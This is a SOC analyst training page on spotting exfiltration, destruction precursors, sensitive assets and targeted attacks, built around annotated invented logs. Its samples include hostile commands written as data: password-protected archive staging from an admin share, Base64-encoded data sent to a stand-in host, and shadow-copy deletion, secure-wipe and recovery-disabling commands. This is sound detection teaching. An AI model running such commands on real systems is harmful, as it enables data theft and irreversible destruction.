---
title: "Spotting Exfiltration, Destruction, Sensitive Targets and Targeted Attacks in Alert Data"
tags:
  - training
  - blue-team
  - soc
  - triage
  - exfiltration
  - analysis
---

# Spotting Exfiltration, Destruction, Sensitive Targets and Targeted Attacks in Alert Data { #exfil-destruction-sensitive }

!!! abstract "What this page covers"
    The previous page said which alerts are dangerous; this one shows **what those situations actually look like in your data**, so you can recognise them in a queue. First **data exfiltration**: thinking like the attacker about every step it needs (access, staging, a way out, preparation, upload), then the clues each step leaves — DNS tunnelling in Zeek `dns.log`, long or heavy connections in `conn.log`, password-protected split archives in **4688** events, bursts of outbound firewall denies, DLP and UEBA alerts, cloud-storage uploads and URLs with long unexplained parameters in proxy logs — every sample read field by field. Then **data destruction**: the early-warning signs (compromised patch and deployment servers, privileged accounts, unexpected Group Policy changes in **5136**, secure-deletion tools such as `sdelete`, `cipher /w`, `shred`, raw-disk drivers in **7045** and Sysmon **6**, known wiper families). Then **sensitive hosts, users and data**: why pre-classification beats guessing, how SIEM lookups and enrichment put criticality into the alert, and what to check by hand (an Active Directory lookup read line by line). Finally the **signs of a targeted attack** — indicators unknown to every open source, one-of-a-kind files, attack files and pages customised for your company, well-researched phishing, hands-on-keyboard tooling — with an opportunistic-vs-targeted comparison. Practice questions with explanations at the end.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. The company (Kestrel Logistics), hostnames, accounts, domains, IPs and log lines are invented for illustration (`.example`, documentation and private IPs).

## The 8 key points { #key-points }

1. **Exfiltration is the last step of a long chain**: access the data → stage it where it can leave → find a way out → prepare it (compress, encrypt, split) → upload it. Each step can leave evidence, so you can catch the *preparation* as well as the transfer.
2. Classic exfiltration clues: **high-volume DNS** to one domain (tunnelling), **large or long-running connections** from an unusual source to an odd destination, **compressed archives created from the command line** (especially with passwords or split volumes: `7z -p -v`, `rar -hp -v`), **many outbound firewall denies on different ports from one host**, **DLP/UEBA alerts**, uploads to **cloud storage**, and **URLs with long unexplained (often Base64-like) parameters**.
3. Destruction is harder to catch early, so **decide how it would happen in your environment and set early-warning alerts** for those routes: compromised **patch/deployment servers**, compromised **high-privilege accounts**, **unrecognised GPO changes**, **secure-deletion or raw-disk tools**, and **known wiper families**.
4. Secure-deletion tools (`sdelete`, `cipher /w` on Windows; `shred`, `wipe`, `srm` on Linux) are rarely run by normal users from a command line, so alerts on them are **low-noise** — and drivers that give raw disk access (used by several wipers to bypass NTFS permissions) are visible as **driver loads and service installs**.
5. The best way to know an alert touches something sensitive is **pre-classification**: critical hosts, admins and sensitive data are listed in advance, and the alert itself says "on critical system". Ideally the list is **updated automatically** from asset inventory and Active Directory.
6. If the alert doesn't carry it, **enrich at triage time**: look up the user, the host and the data first. Even naming conventions (`KL-DC01`, `KL-FIN-DB01`) and job titles ("chief engineer", "help desk" — both high-value for different reasons) change the priority.
7. **Targeted attack tells**: indicators that match public reporting on a known group, domains or files **unknown to every open source**, files seen **once in the whole world**, malware a vendor names as an advanced family, **your own logo, names or infrastructure** inside the attack files or pages, phishing that shows **inside knowledge**, and hands-on actions (remote-access tools, quick lateral movement, signed malware, zero-days, look-alike domains, cloned pages).
8. Rarity is the common thread: opportunistic campaigns are loud and quickly documented by the community; targeted ones are quiet and unique. **"Nobody has ever seen this" is a warning, not a reassurance.**

## Why this matters in a SOC { #why }

Knowing that "exfiltration is near completion" is useless if you can't recognise exfiltration when the alert in front of you says `DNS - excessive query length` or `Proxy - long URI parameter`. Alert titles are written by rule authors and describe *symptoms*, not intentions. Triage means mapping those symptoms back to the situations that matter: data leaving, data about to be destroyed, a crown jewel being touched, a determined attacker at work.

This page is that mapping. For each situation we ask "if I were the attacker, what would I have to do in *this* environment, and what would each action leave behind in *our* logs?" — then look at what those traces actually look like. The same thinking works in reverse for detection engineering: every clue below is also a candidate alert you can build.

## Spotting data exfiltration { #exfiltration }

### Think like the attacker first { #exfil-threat-model }

Put on the attacker's hat. You want the shipment database out of Kestrel Logistics. What has to happen?

1. **Access the data.** You need an account or a process that can read it — so there may be unusual logons (4624/4672) or file and database access first.
2. **Stage it.** Data rarely leaves directly from the database server; it gets copied to a host that can reach the internet, or into a working folder.
3. **Find a way out.** What does the firewall allow? Is there a proxy? Is DNS the only thing that leaves freely? You may probe.
4. **Prepare it.** Compress it (smaller, faster), encrypt or password-protect it (so DLP and proxies can't read it), split it (smaller pieces dodge size limits and are easier to retry).
5. **Upload it.** Over the C2 channel, to cloud storage, over DNS, or hidden in ordinary-looking web requests.

Exfiltration is a **late-stage** activity, so by the time it happens many earlier steps have happened too. You might catch any of them — or the preparation and transfer themselves. Map your own controls and visibility against these five steps and you know which ones you would see.

### The clues, and where each one shows up { #exfil-clues }

| Clue | Which step | Where it shows up | ATT&CK |
| --- | --- | --- | --- |
| High-volume DNS with long random subdomains to one domain | Upload (or C2) | DNS server logs, Zeek `dns.log`, passive DNS | T1071.004, T1048 |
| Large upload or very long connection from an unusual source to an odd destination | Upload | NetFlow, Zeek `conn.log`, firewall, proxy | T1041, T1048 |
| Archive created from the command line, with password or split volumes | Prepare | 4688 / Sysmon 1, EDR | T1560.001 |
| Many outbound denies on different ports from one source | Find a way out | Firewall logs | (egress probing before T1048) |
| DLP or UEBA alerts | Access, stage, upload | DLP console, UEBA | — |
| Upload to file-sharing or cloud storage, or a sync tool appearing | Upload | Proxy, CASB, EDR | T1567.002 |
| URLs with long unexplained, Base64-looking parameters | Upload | Proxy logs, Zeek `http.log` | T1041, T1132.001 |

Each one below.

### High-volume DNS tunnelling { #dns-tunnelling }

DNS tunnelling encodes data into the **names** being looked up. Because every network lets DNS out (somewhere), it is a favourite way out when everything else is blocked. A Zeek `dns.log` excerpt (columns trimmed):

```
ts                  id.orig_h     query                                                         qtype_name  rcode_name
1764141601.104512   10.20.4.112   mzxw6ytboi2dqnrrge3tmmjq.gm4tqojrgy3dkmbqgu.t.kl-cdn.example   TXT         NOERROR
1764141601.211873   10.20.4.112   nfxgg5bamjzgk3tf.hjswy3dpebwgk4tt.mfsgc4tf.t.kl-cdn.example    TXT         NOERROR
1764141601.318020   10.20.4.112   onsxe5tjmnswk.zlomvzgc3tj.nzswk5dj.t.kl-cdn.example             TXT         NOERROR
```

- `ts` — Unix timestamps about **0.1 s apart**. A person browsing does not resolve a new unique name ten times a second.
- `id.orig_h 10.20.4.112` — the internal host asking. (This is KL-WS-0412 from the previous page.)
- `query` — the left-hand labels (`mzxw6ytboi2d…`) are **Base32-looking gibberish**, long and never repeated. Real hostnames are short and repeat. The data is in these labels: the attacker controls the authoritative server for `t.kl-cdn.example`, so every query arrives there and is decoded.
- `qtype_name TXT` — TXT records can carry arbitrary text **back**, which tunnelling tools use for the return channel. A workstation asking for thousands of TXT records is very unusual.
- `rcode_name NOERROR` — the attacker's server is answering, so the channel works.

A quick count makes the volume obvious:

```
$ cat dns.log | zeek-cut id.orig_h query | awk '{n=split($2,a,"."); print $1, a[n-2]"."a[n-1]"."a[n]}' | sort | uniq -c | sort -rn | head -3
  18342 10.20.4.112 t.kl-cdn.example
    911 10.20.4.37  corp.kestrel.example
    402 10.20.4.112 corp.kestrel.example
```

- `zeek-cut id.orig_h query` — print just those two columns from the log.
- `awk '{…}'` — split the query on dots and keep only the **last three labels** (the zone the data is being sent to), printed after the client IP.
- `sort | uniq -c | sort -rn | head -3` — count identical lines, most frequent first.
- Result: **18,342 queries** from one workstation to one external zone, twenty times more than its lookups for the company's own domain. That is tunnelling, not browsing (more in [DNS abuse](../dns/dns-abuse.md)).

### Large or long connections to odd destinations { #long-connections }

Bulk transfer leaves a shape in flow data. A Zeek `conn.log` line:

```
ts                 id.orig_h     id.resp_h      id.resp_p  proto  service  duration    orig_bytes    resp_bytes  conn_state
1764142010.55201   10.30.8.21    203.0.113.88   443        tcp    ssl      14512.31    9663427810    1840233     SF
```

- `id.orig_h 10.30.8.21` — the **source**: a server in the finance range, not a user PC. Servers usually *receive* connections; a server *initiating* a big outbound transfer is unusual.
- `id.resp_h 203.0.113.88`, `id.resp_p 443`, `service ssl` — an external host on HTTPS. The content is encrypted, so you judge by shape and destination.
- `duration 14512.31` — about **4 hours** of one continuous connection.
- `orig_bytes 9663427810` — about **9.7 GB sent from inside to outside**. Note the direction: `orig_bytes` is what the originator (our server) sent.
- `resp_bytes 1840233` — only 1.8 MB came back: acknowledgements, not downloads. Upload-heavy ratio = data leaving.
- `conn_state SF` — the connection set up and closed normally: the transfer finished.

Next step: pivot to the proxy or TLS logs (Zeek `ssl.log`: what server name, which certificate?) and to the destination's reputation. Remember that **legitimate file-sharing services make excellent exfiltration points** precisely because they are trusted and allowed; unless they are against policy, they don't stand out.

### Archives built from the command line { #archives }

Most people zip files by right-clicking. Attackers use command-line archivers, and the flags give them away:

```
Event ID 4688  Computer: KL-FS02   2026-11-24 04:02:55
  Creator Subject:     AccountName svc_backup
  New Process Name:    C:\Users\Public\Music\rar.exe
  Creator Process:     C:\Windows\System32\cmd.exe
  Process Command Line: rar.exe a -hpLogistix2026 -m5 -v500m -r C:\Users\Public\Music\m.rar \\KL-FIN-DB01\D$\Exports\
```

- **4688** = "A new process has been created" (Security log, when process-creation auditing is on; Sysmon event 1 is the richer equivalent). Attackers care because every tool they launch writes one, which is why many try to run from memory or through trusted binaries.
- `New Process Name C:\Users\Public\Music\rar.exe` — the command-line RAR tool, from a **world-writable folder** nobody installs software into.
- `a` = add to archive. `-hp<password>` = encrypt **file contents and headers** with that password (so even the file names inside are hidden from DLP). `-m5` = maximum compression. `-v500m` = **split into 500 MB volumes**. `-r` = recurse into subfolders.
- `\\KL-FIN-DB01\D$\Exports\` — the source is an **administrative share** on the database server: data being pulled across the network into a staging folder.
- ATT&CK **T1560.001 Archive Collected Data: Archive via Utility** and **T1074.001/.002 Data Staged** (local / remote).

Because ordinary users almost never run archivers with password and split flags from a command line, an alert on `7z`/`rar`/`winrar` with `-p`, `-hp` or `-v` is a **low-volume, high-value** detection.

### Many denied ports from one source { #egress-probing }

An attacker who doesn't know the firewall rules will try several ports until one works:

```
2026-11-24T03:55:01 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=8080 proto=tcp
2026-11-24T03:55:02 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=8443 proto=tcp
2026-11-24T03:55:02 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=21   proto=tcp
2026-11-24T03:55:03 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=22   proto=tcp
2026-11-24T03:55:03 KL-FW01 action=deny src=10.20.4.112 dst=198.51.100.9 dport=53   proto=udp
2026-11-24T03:55:04 KL-FW01 action=allow src=10.20.4.112 dst=198.51.100.9 dport=443 proto=tcp
```

- Same `src` and same `dst`, **one port after another**, a second apart: an automated "which way out is open?" test (some tools do exactly this, and so do some C2 implants with fallback ports).
- `action=allow … dport=443` — the last line is the one that matters: the attacker found the open path. Now look at what went over it.
- One denied connection means nothing. **Many different ports to the same destination from one internal host in seconds** is the pattern.

### DLP and UEBA alerts { #dlp-ueba }

**Data loss prevention (DLP)** tools inspect content (on the endpoint, in email, in the proxy) for sensitive patterns or labels. **User and entity behaviour analytics (UEBA)** builds a baseline per user and host and alerts when behaviour departs from it ("`svc_backup` read 40× its normal data volume"). Individually these alerts are often noisy. Their value in triage is **stacking**: one internal source collecting several alerts — "sensitive data accessed", "unusual volume", "archiving command line" — is the picture of collection and staging ([DLP and UEBA](../endpoint-defense/paw-edr-dlp-ueba.md)).

### Cloud storage and sync tools { #cloud-exfil }

```
2026-11-24 04:31:12 10.20.4.112 j.moreno CONNECT g.api.mega.example:443 200 TCP_TUNNEL 512334992 "rclone/v1.6x"
```

- `CONNECT g.api.mega.example:443` — an HTTPS tunnel to a **cloud-storage API** host.
- `512334992` — about 512 MB sent through the tunnel.
- `"rclone/v1.6x"` — the User-Agent of **rclone**, a legitimate command-line sync tool that is widely abused for exfiltration because it speaks to dozens of cloud providers. A logistics clerk does not normally run it.
- ATT&CK **T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage**.

### URLs with long, unexplained parameters { #long-parameters }

Data can be smuggled out in ordinary-looking GET requests:

```
GET /index/__utm.gif?cookie=UmVwb3J0X1EzLmNzdjtjbGllbnRzPTQxMjt0b3RhbD04ODMyMTA=&r=482 HTTP/1.1
Host: stats.kl-metrics.example
```

- `/index/__utm.gif` — dressed up as an analytics tracking pixel, which everybody's browser requests constantly.
- `cookie=UmVwb3J0X1Ez…` — a long value made only of letters, digits and maybe `+/=`: **Base64**. Real analytics parameters are short IDs or readable names. Decode it safely (`echo '…' | base64 -d`) and this one reads `Report_Q3.csv;clients=412;total=883210` — file data being sent out.
- One such request is nothing; **hundreds of requests with different long values to the same host** is a channel ([Base64](../http-analysis/base64.md)). ATT&CK **T1132.001 Data Encoding: Standard Encoding** over **T1041 Exfiltration Over C2 Channel**.

## Spotting data destruction attempts { #destruction }

### Plan for it before it happens { #destruction-planning }

Destruction (ransomware encryption, wipers) is fast, and once it starts the window is small. Catching it *before* it starts is hard but sometimes possible — **if** you have thought about how it would be done in your environment and placed early warnings on those routes. Ask: "if someone wanted to break every computer here at once, how would they push the payload out?"

### The early-warning signs { #destruction-signs }

- **Compromise of patching or software-deployment servers.** The system that can install software on every machine can also install a wiper on every machine (**T1072 Software Deployment Tools**). Unusual logons to, or new packages on, these servers deserve top priority.
- **Compromise of high-privilege accounts.** Mass destruction needs mass access: domain admins, deployment service accounts, hypervisor admins.
- **Unrecognised Group Policy changes.** A GPO that creates a scheduled task or startup script on every computer is a classic way to run a payload everywhere (**T1484.001 Domain or Tenant Policy Modification: Group Policy Modification**). With directory-service change auditing on, the domain controller writes **5136** ("A directory service object was modified"):

    ```
    Event ID 5136  Computer: KL-DC01   2026-11-24 05:10:44
      Subject:    AccountName svc_backup
      Object:     DN CN={6B2F…},CN=Policies,CN=System,DC=corp,DC=kestrel,DC=example
                  Class groupPolicyContainer
      Attribute:  LDAP Display Name gPCMachineExtensionNames
      Operation:  Type Value Added
    ```

    - **5136** fires on a domain controller when an Active Directory object's attribute changes. Here the object class is `groupPolicyContainer` — a **GPO**.
    - `gPCMachineExtensionNames` changing means new kinds of computer settings (for example scheduled tasks or scripts) were added to the policy.
    - `AccountName svc_backup` — a backup service account editing Group Policy is not normal administration. Attackers care about GPOs because one edit reaches every machine the policy applies to at the next refresh.

- **Use of secure-deletion or raw-disk tools.**

    ```
    Process Command Line: sdelete64.exe -accepteula -p 3 -s -q D:\Exports\
    Process Command Line: cipher.exe /w:D:\
    ```

    - `sdelete` (Sysinternals): `-p 3` overwrite three times, `-s` recurse into subfolders, `-q` quiet, `-accepteula` suppress the licence prompt (a tell of unattended, scripted use).
    - `cipher /w:D:\` — a built-in Windows tool; `/w` **overwrites free space** on the drive so deleted files can't be recovered.
    - On Linux, alert on `shred`, `wipe` and `srm` in process or audit logs (for example an auditd `EXECVE` record with `a0="shred" a1="-n" a2="3" a3="-u"`).
    - Normal users almost never run these from a command line, so false positives stay low. ATT&CK **T1485 Data Destruction**, **T1070.004 File Deletion** when used to cover tracks.

- **Drivers that give raw disk access.** Several wipers have loaded a legitimate, signed third-party driver that reads and writes the disk directly, sidestepping NTFS permissions (the 2012 Shamoon attacks and the 2014 Destover attack on a film studio both used a commercial raw-disk driver; in 2022 a wiper abused a partition-manager driver). A new kernel driver shows up as **7045** in the System log ("A service was installed in the system", with `Service Type: kernel mode driver`) and as **Sysmon event 6** ("Driver loaded"), which records the driver's path, hashes and signature. An unexpected kernel driver on a server — especially one signed by a disk-utility vendor you don't use — is an early warning (**T1561 Disk Wipe**, **T1014 Rootkit** / **T1068** when vulnerable drivers are abused).
- **Known wiper or ransomware family detected.** If antivirus or EDR names a family known for destruction, or reports worm-like spreading, ring the alarm immediately — even if the first instance was blocked.
- **[Supplement] Recovery being removed.** Shadow-copy deletion (`vssadmin delete shadows /all /quiet`, `wmic shadowcopy delete`), `bcdedit /set {default} recoveryenabled no` and attacks on backup consoles (**T1490 Inhibit System Recovery**) usually come minutes before encryption.

## Spotting sensitive hosts, users and data { #sensitive }

### The best way: classify in advance { #pre-classification }

How do you know an alert involves a critical host, a key person or sensitive data? The best answer is that **somebody decided it before the alert fired**, and the alert says so. Compare:

```
Exploit attempt: SMB remote code execution → 10.30.8.21
Exploit attempt: SMB remote code execution → 10.30.8.21 [CRITICAL ASSET: KL-FIN-DB01, tier-0 data, owner Finance]
```

The second version needs no thinking. To produce it, the SIEM looks up each entity in a list of critical assets and identities **when the alert is created** and raises the priority on a match. That only works if:

- the list exists and **updates itself** — fed from the asset inventory/CMDB and from **Active Directory** (members of `Domain Admins`, accounts with `adminCount=1`, the `Executives` group, servers in the `Tier0` OU) rather than a spreadsheet someone last edited two years ago;
- the organisation actually **knows where its sensitive data lives and who can reach it** — a problem many struggle with long before the SOC gets involved.

A simple SIEM lookup file might look like:

```
host,ip,criticality,owner,notes
KL-DC01,10.10.0.10,tier0,IT-Identity,domain controller
KL-FIN-DB01,10.30.8.21,tier0,Finance,shipment and billing database
KL-OT-HMI03,10.90.3.13,tier0,Warehouse-OT,conveyor HMI - change window Sun 02:00
KL-WS-0388,10.20.4.88,low,Facilities,lobby kiosk
```

Each column is something triage needs: how critical, who owns it (who to call), and notes such as the maintenance window (an unsigned driver loaded on KL-OT-HMI03 during the Sunday change window is a different story from one at 08:30 on a Tuesday).

### When the alert doesn't tell you: enrich { #enrichment }

If criticality isn't in the alert, the next best thing is **automatic enrichment** when you open it (most alert-handling and SOAR tools can do this). At a minimum, **looking up the user, the asset and the data is your first triage step**. A quick Active Directory lookup:

```
PS> Get-ADUser j.moreno -Properties Title,Department,Manager,MemberOf,adminCount |
      Select-Object SamAccountName,Title,Department,adminCount,@{n='Groups';e={$_.MemberOf -replace '^CN=([^,]+).*','$1'}}

SamAccountName : j.moreno
Title          : Help Desk Analyst
Department     : IT Service Desk
adminCount     : 1
Groups         : {Helpdesk-L2, Workstation-Admins, VPN-Users}
```

- `Get-ADUser j.moreno` — fetch the user object; `-Properties …` asks for attributes that aren't returned by default.
- `Select-Object …` — show only the useful fields; the `@{n='Groups';e={…}}` part is a calculated column that strips each group's distinguished name down to its common name.
- `Title: Help Desk Analyst` — help-desk staff look junior but often hold **broad rights** (password resets, admin on every workstation). Compromise of such an account is high-value for an attacker — just as "chief engineer" is high-value for the data they can reach.
- `adminCount: 1` — this account is or was in a protected administrative group. Treat as privileged.
- `Workstation-Admins` — local admin on all workstations: an attacker holding this account can move laterally almost anywhere.

Even without tools, **naming conventions** carry context: `KL-DC01` (domain controller), `KL-FIN-DB01` (finance database), `KL-OT-…` (operational technology). A good naming standard is a free enrichment source.

## Targeted attack identification { #targeted }

Targeted attackers are the "advanced or targeted" category of danger. They won't announce themselves, but some clues point to an attacker who chose *you* or who is more capable than average:

| Area | Tell | Why it suggests a targeted or capable attacker |
| --- | --- | --- |
| **Specific IOCs** | Domain, IP or hash matches a public report on a known advanced group | The easy case: someone has already done the attribution work |
| | Domain or URL **unknown to every open source** (URL scanners, reputation services, passive DNS) | Mass campaigns are submitted to community services within hours; total absence suggests infrastructure built for few victims |
| **Files** | Malware **never seen anywhere before** (AV/EDR cloud reputation: prevalence 1) | Commodity malware is everywhere; a one-of-a-kind file was likely built for you |
| | Vendor names the file as a family associated with advanced groups | Strong signal; move quickly |
| | **Interactive post-exploitation tools** (C2 frameworks, credential dumpers) | Someone is at the keyboard, not an automated bot |
| | Files **customised to you**: your company name, internal hostnames or domain in strings or config | Someone spent effort tailoring the attack |
| **Email** | A **well-tailored lure to one specific person** | Research into who does what |
| | **Inside knowledge**: internal project names, real colleagues, real processes | Prior reconnaissance or a prior compromise |
| **Actions** | Installation of **remote-access tooling** (T1219) | Persistent, interactive access |
| | **Lateral movement soon after initial compromise** | A human pursuing a goal inside your network |
| | **High-quality signed malware** (T1553.002) | Stolen or bought code-signing certificates cost money and effort |
| | **Zero-day exploits** (T1203, T1190) | Expensive; not wasted on random targets |
| | **Look-alike domains and cloned pages** of your own sites (T1583.001, T1566.002) | Built for your users specifically |

About file rarity: a former head of the NSA's offensive hacking unit once gave defenders this advice in a public talk (paraphrased): if your reputation service tells you an executable has been seen exactly once in the history of the Internet — and that once is on your machine — you should be very worried. That is the same logic as the "lowest count" rule from the previous page, applied to the whole world instead of your SIEM.

### Opportunistic vs targeted: a side-by-side { #opportunistic-vs-targeted }

Two invented phishing alerts from the same morning:

| | Alert P1 | Alert P2 |
| --- | --- | --- |
| Recipients | 2,300 mailboxes across many companies (shared blocklist hit) | 1 mailbox: `r.ito`, head of warehouse automation |
| Lure | "Your parcel could not be delivered" | "Conveyor PLC firmware 4.2 — vendor change notice for the Sunday window", signed with a real vendor contact's name |
| Link | `hxxps://parcel-track-update.example/…` — 214 submissions on URL-scanning services, 9 days old | `hxxps://kestrel-ot-portal.example/notice` — **no results anywhere**; registered 3 days ago; page is a **pixel-perfect clone** of Kestrel's supplier portal with the Kestrel logo |
| Attachment | None | `PLC_notice.pdf.lnk` — hash prevalence **1** in the EDR cloud; strings contain `KL-OT-HMI` |
| Verdict | Opportunistic. Block, purge, normal priority. | **Targeted.** Inside knowledge (maintenance window, OT naming), unique infrastructure and file, customised to Kestrel. Raise to the top and tie to the A8 driver alert on KL-OT-HMI03 from the previous page. |

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    The approach is unchanged: model how exfiltration or destruction would have to happen in *your* environment, alert on each step, and stack weak signals from one source. The concrete clues still work — DNS tunnelling volume, upload-heavy long connections, command-line archivers with password and split flags, egress probing in firewall logs, Base64-looking parameters, secure-deletion tools, unexpected kernel drivers (7045, Sysmon 6), GPO changes (5136) and shadow-copy deletion. Pre-classified critical assets and identities, and enrichment at triage time, remain the way to know what is sensitive. Rarity — unknown to open sources, prevalence of one — is still one of the best tells of a targeted attack.

!!! info "[Changed] What has changed"
    - **Theft often replaces encryption.** Industry reporting since 2024 describes a large share of extortion attacks that steal data without encrypting it, and Mandiant's M-Trends 2026 describes "recovery denial" — operators going after backups, identity services and hypervisors. Exfiltration signs are now often *the* main event, not a prelude.
    - **Exfiltration rides trusted services.** Cloud-storage APIs and sync tools (rclone and similar), SaaS file sharing, and direct theft from SaaS tenants with stolen tokens are now common. Much of this never touches your proxy; you need cloud and SaaS audit logs (and CASB) as well.
    - **Less DNS visibility.** DNS over HTTPS and encrypted DNS can hide tunnelling from classic DNS logs unless you force clients to your resolvers ([encrypted DNS](../dns/encrypted-dns.md)).
    - **Destruction through management planes.** Recent wipers still use raw-disk access and vulnerable signed drivers (BYOVD), but reporting in 2025–26 also describes attackers abusing legitimate device-management and cloud consoles to wipe or reset devices at scale, which leaves traces in those consoles' audit logs rather than in endpoint process events. Treat admin access to MDM, backup and virtualisation consoles as a destruction route.
    - **Built-in criticality.** XDR and exposure-management platforms now let you tag critical assets and identities and feed that into incident priority; identity platforms expose privileged-role membership directly. The principle is the same — the list must still be correct.
    - **ATT&CK v19/v20.** The tactics used here (Collection, Exfiltration TA0010, Impact TA0040) and techniques (T1560.001, T1567.002, T1048, T1041, T1485, T1490, T1561, T1484.001, T1072) keep their IDs; since v19 (April 2026) defence-evasion techniques are split between Stealth (TA0005) and Defense Impairment (TA0112).

!!! warning "[Caution] Wrong or risky to do the old way"
    - **"Well-written and personalised" no longer proves targeting.** Industry reports in 2025–26 describe AI-written phishing as the baseline: fluent, tailored lures are now cheap at scale. Weigh *inside knowledge* (internal names, real processes, real timing) and *unique infrastructure* far more than polish.
    - **"Unknown to OSINT" is not proof either.** Brand-new opportunistic infrastructure is also unknown for its first hours. Combine rarity with other tells.
    - **Don't submit a possibly targeted URL or file to public scanners** just to check rarity: the attacker may watch for it, and you may leak data. Search for existing results first; use private analysis ([analysis OPSEC](../http-analysis/evil-http-and-reputation.md)).
    - **Don't assume encrypted traffic hides everything.** Direction, volume, duration and destination in `conn.log` still reveal bulk exfiltration.
    - **Don't treat backup and deployment servers as "IT plumbing".** They are top destruction routes and belong on the critical-asset list.

## Practice questions { #quiz }

### Question 1

A UEBA alert says `svc_reports` read 30 times its normal volume from the HR share overnight. In the same hour, EDR shows `7z.exe a -p -v100m` on the same server, and the firewall shows twelve denied outbound connections on different ports from that server, then one allowed on 443. What is happening, which exfiltration steps do you see, and what do you check next?

??? success "Answer and explanation"
    This is very likely **data collection, preparation and exfiltration in progress** — a near-completion situation that goes to the top of the queue.

    - UEBA volume spike = **access** to the data (and possibly **staging**).
    - `7z a -p -v100m` = **preparation**: password-protected (hides contents from DLP), split into 100 MB volumes. T1560.001.
    - Many denies on different ports then an allow on 443 = **finding a way out** (egress probing), and the found path.

    Next: in `conn.log`/proxy, look at the allowed 443 connection's **duration, `orig_bytes` vs `resp_bytes`** and the destination (TLS server name, reputation, cloud storage?); check where the archive volumes are and whether they still exist; check how `svc_reports` logged on (4624/4672, from where). Contain according to your procedures.

### Question 2

Name four early-warning signs of a destructive attack and the log source or event that would show each.

??? success "Answer and explanation"
    Any four of:

    - **Compromised patch/deployment server** (T1072) — unusual logons (4624/4672) on the server, new packages or jobs in the deployment tool's logs.
    - **Compromised high-privilege account** — 4624/4672 for admin accounts on unusual hosts, 4768/4769 Kerberos activity at odd times.
    - **Unrecognised GPO change** (T1484.001) — **5136** on domain controllers with object class `groupPolicyContainer`.
    - **Secure-deletion tools** — **4688**/Sysmon 1 with `sdelete`, `cipher /w`; auditd/EDR on Linux for `shred`, `wipe`, `srm` (T1485).
    - **Raw-disk drivers** — **7045** (kernel-mode driver service installed) and **Sysmon 6** (driver loaded) for an unexpected signed driver (T1561).
    - **Known wiper/ransomware family** — antivirus/EDR detection names, worm-like spreading alerts.
    - **Recovery removal** — `vssadmin delete shadows`, `bcdedit … recoveryenabled no` (T1490).

### Question 3

An alert reads "Malicious LNK executed on WS-2231, user k.sato". Nothing in it says whether this is important. What do you look up first, and which findings would make you suspect a targeted attack?

??? success "Answer and explanation"
    First look up the **user** (title, department, privileged groups, `adminCount`), the **host** (naming, asset list criticality, owner) and, if any, the **data** the user can reach. A "chief engineer", an executive, finance staff who can move money, or a help-desk account with admin rights on all workstations all raise the priority.

    Targeted-attack tells to check: the LNK's hash **prevalence** (seen once worldwide?), whether vendors name it as an advanced family, whether its strings or the payload's configuration contain **your company or hostnames**, how it arrived (a tailored email to this one person with **inside knowledge**?), whether the domains it contacts are **unknown to every open source** or are **look-alikes** of your own, and whether the follow-on actions are hands-on (remote-access tools, quick lateral movement).

## Related { #related }

- [Triage and defining "dangerous"](defining-dangerous.md) — the previous page
- [DNS abuse and tunnelling](../dns/dns-abuse.md) · [Encrypted DNS](../dns/encrypted-dns.md) · [Base64](../http-analysis/base64.md)
- [Lateral movement, collection and exfiltration](../endpoint-attacks/lateral-collection-exfil.md) · [DLP and UEBA](../endpoint-defense/paw-edr-dlp-ueba.md)
- [Hashing and code signatures](../file-analysis/hashing-signatures.md) · [Remote-access tools](../other-protocols/remote-tools-summary.md)
- [Impairing defences and clearing logs](../../../adversary/impair-defenses-log-clearing.md) · [Phishing delivery](../../../adversary/phishing-delivery.md)
